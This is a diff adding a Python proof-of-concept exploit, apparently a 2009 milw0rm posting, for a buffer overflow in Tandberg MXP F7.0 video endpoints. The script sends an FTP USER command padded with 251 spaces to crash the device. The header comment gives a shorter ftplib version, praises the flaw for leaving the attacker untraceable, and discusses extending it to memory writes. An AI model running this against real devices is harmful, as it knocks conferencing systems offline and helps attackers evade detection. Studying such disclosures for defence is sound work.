@@ -1,0 +1,74 @@
+#########################################################################################
+#											#
+# TANDBERG BoF v0.1 - Tandberg MXP F7.0<                                                #
+# Buffer Overflow Vulnerability PoC                                                     #
+# By otokoyama                                                                          #
+#                                                                                       #
+# [+] We crash the process FtpCt00 by sending a 251 char string of /x20 commonly        #
+#     known as a blank space.(very simple)						#
+# [+] The BOF happens due to the system passing all usernames:passwords to a log file.  #
+#                                                                                       #
+# [+] Vendor has fixed THIS in the later releases of its firmware so it is now public.  #
+#     											#
+# 			                                                                #
+# This is a good vuln due to the system not logging the IP address of the attacker.     #
+# To be able to tell who was causing this you would need to grab a log from the FW      #
+# and as TANDBERG does not provide timestamps on their endpoints pre f8.0               #
+# you would need to have recieved a SNMP notification to TMS that the system rebooted   #
+# and cross reference that with the IP's connecting through the firewall.    		#
+# This is particularily annoying due to the fact that systems reboot all the time	#
+# As endusers are constantly turning them on\off					#
+# At this point the sysadmin goes "TANDBERG Can we buy an Expressway?"        		#
+#										        #
+# As far as it goes, creating a connectback shell would be difficult                    #
+# this is mainly due to the process on the Endpoint that detects a memory mismatch      #
+# and subsequently reboots the system(security measure).                                #
+#                                                                                       #
+# To create a successfull exploit outside of the DoS                                    #
+# you would need to locate the memory address of the process that reboots the system    #
+# (there might even be a fallback on that) This is generally too cumbersome as          #
+# this embeded system doesn't do anything fun anyway (why would you want access)        #
+#	                                                                                #
+# In saying that,                                                                       #
+# it would be fairly trivial to use the BoF to write something to the memory.           #
+# you will notice buffer below only generates the exception 0x0200 aka Machine Check.   #
+# Increasing the char sent to the unit will change that error to exception 0x1100       #
+# meaning we are sending the MINIMUM required length to overflow the buffer.            #
+# I have done the hardwork for you! Please email me if you get some encodes.  		#
+# BTW, This could be done like this:                                                    #
+# from ftplib import FTP                                                                #
+# ftp = FTP('ip.addr')                                                                  #
+# ftp.login(' '*251)                                                                    #
+# ftp.quit()....but its dirty.		                                                #
+#						                                        #		
+# shoutouts:mabus,gso                                                                   #
+#########################################################################################
+
+import socket
+import struct
+import time
+import sys
+
+
+buff='USER '+' '*251+'\r\n'
+
+if len(sys.argv)!=3:
+	print "\n[+] Usage: %s <ip> <port>"%sys.argv[0]
+	print "[-] Example: python poc.py 192.168.1.23 23\n" 
+	sys.exit(0)
+
+try:
+	
+        print "[+] Connecting... %s" %sys.argv[1]
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect((sys.argv[1],int(sys.argv[2])))
+	print "[+] Sending data..."
+	time.sleep(1.2)
+	s.send(buff)
+        print "[+] Deed Done"
+        s.recv(1024)
+	
+except:
+	print "[#] Unable to connect"
+
+# milw0rm.com [2009-07-13]
